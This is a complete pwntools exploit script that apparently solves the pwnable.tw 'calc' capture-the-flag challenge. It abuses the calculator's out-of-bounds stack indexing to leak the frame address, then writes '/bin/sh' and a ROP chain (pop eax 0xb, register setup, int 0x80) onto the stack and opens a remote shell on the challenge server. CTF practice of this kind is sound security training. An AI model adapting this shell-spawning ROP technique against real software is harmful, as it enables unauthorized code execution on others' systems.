from pwn import *

pop_edx_ecx_ebx = 0x080701d0
int80 = 0x08049a21
pop_eax = 0x0805c34b

def leak(offset):
    io.sendline(f"00+{offset}".encode())
    return int(io.recvline())

def write(offset, value):
    old_value = leak(offset)
    diff = value - old_value

    if diff > 0:
        io.sendline(f'00+{offset}+{diff}'.encode())
    else:
        io.sendline(f'00+{offset}-{abs(diff)}'.encode())
    io.recvline()

io = remote("chall.pwnable.tw", 10100)

# io = process(["./calc"])
# io = gdb.debug("./calc", gdbscript="""
# break *parse_expr
# break *0x08049432
# continue
# """)

io.recvline()

_leak = leak(360)
ebp = _leak - 32

write(380, int.from_bytes(b'/bin', 'little')); write(381, int.from_bytes(b'/sh\x00', 'little'))
write(361, pop_eax); write(362, 0xb); write(363, pop_edx_ecx_ebx); write(364, 0); write(365, 0); write(366, ebp + 80); write(367, int80)

io.sendline(b'hacked')
io.interactive()
# Flag: FLAG{C:\Windows\System32\calc.exe}